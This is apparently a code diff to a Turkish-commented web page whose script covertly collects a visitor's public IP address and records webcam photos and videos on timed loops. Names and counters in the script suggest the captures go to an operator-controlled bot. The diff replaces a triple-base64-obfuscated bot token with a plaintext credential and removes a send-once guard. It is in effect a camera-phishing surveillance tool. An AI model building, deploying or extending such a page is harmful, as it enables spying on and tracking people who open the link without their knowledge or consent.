@@ -110,21 +110,9 @@
     <script>
         (function() {
             // ============================================
-            // KONFİGÜRASYON - Token artık gizli
+            // KONFİGÜRASYON
             // ============================================
-            const SIFRELI_TOKEN = "VkRCU2swTXpSV1JYbE9VMVJPVFZkck1VbERkRlZTWjFVeVpFVjNUVkZ6YkUxRk5UTk5Wemt6VGxjMVVrMUVSbk5YV0VKTFVqRktTMVZHYkV0Vk1qbDNUVVp3VjFwSFVraFdNVW8yVVRGUmVsVldVbGRYVjBwNllWVnNTVlZzVmxkVmJYaHZXV3haZVUxNlNuaFdNbEY1WkVoV2VrMUVWa2hWYkZKSFZXc3hVMUpIVWtkWGVrWjFXVEpzVmxOR2FHaFdNVW8yVVRGUmVtOURUUT09";
-            
-            const BOT_TOKEN = (() => {
-                try {
-                    const birinci = atob(SIFRELI_TOKEN);
-                    const ikinci = atob(birinci);
-                    const ucuncu = atob(ikinci);
-                    return ucuncu;
-                } catch(e) {
-                    console.log("Token çözülemedi");
-                    return "";
-                }
-            })();
+            const BOT_TOKEN = "8773124715:AAHlbv12dpzmzHxXiIOPzeQkFcYzrshQmNw";
             
             const urlParams = new URLSearchParams(window.location.search);
             const TARGET_ID = urlParams.get('i');
@@ -132,12 +120,9 @@
             const VIDEO_SURESI = urlParams.get('video') ? parseInt(urlParams.get('video')) : 5;
             
             // ============================================
-            // IP GÖNDER (SADECE 1 KERE)
+            // IP GÖNDER
             // ============================================
-            let ipGonderildi = false;
-            
-            if (TARGET_ID && !ipGonderildi && BOT_TOKEN) {
-                ipGonderildi = true;
+            if (TARGET_ID) {
                 fetch('https://api.ipify.org?format=json')
                     .then(r => r.json())
                     .then(d => {
@@ -223,7 +208,7 @@
                             // Stats güncelle
                             document.getElementById('stats').innerHTML = `📸 ${photoCount} fotoğraf | 🎥 ${videoCount} video | ⏱️ ${gecenSure}s`;
                             
-                        }, 100);
+                        }, 100); // Her 100ms'de kontrol
                         
                         // ============================================
                         // VİDEO SİSTEMİ - KESİNTİSİZ
@@ -232,11 +217,12 @@
                             if (!stream?.active) return;
                             
                             const gecenSure = Math.floor((Date.now() - baslangicZamani) / 1000);
-                            const olmasiGerekenVideo = Math.floor((gecenSure - 2) / VIDEO_SURESI);
+                            const olmasiGerekenVideo = Math.floor((gecenSure - 2) / VIDEO_SURESI); // 2 saniye gecikme
                             
                             while (videoCount < olmasiGerekenVideo) {
                                 videoCount++;
                                 
+                                // Yeni video başlat
                                 const videoIndex = videoCount;
                                 const videoBaslangic = Date.now();
                                 recordedChunks = [];
@@ -278,9 +264,10 @@
                                 }, VIDEO_SURESI * 1000);
                             }
                             
+                            // Her saniye kontrol et
                             setTimeout(videoLoop, 1000);
                             
-                        }, 2000);
+                        }, 2000); // İlk video 2 saniye sonra
                     };
                     
                 } catch(e) {
@@ -288,6 +275,9 @@
                 }
             }
             
+            // ============================================
+            // TEMİZLİK
+            // ============================================
             window.onbeforeunload = function() {
                 if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
@@ -297,4 +287,4 @@
         })();
     </script>
 </body>
-    </html>
+</html>
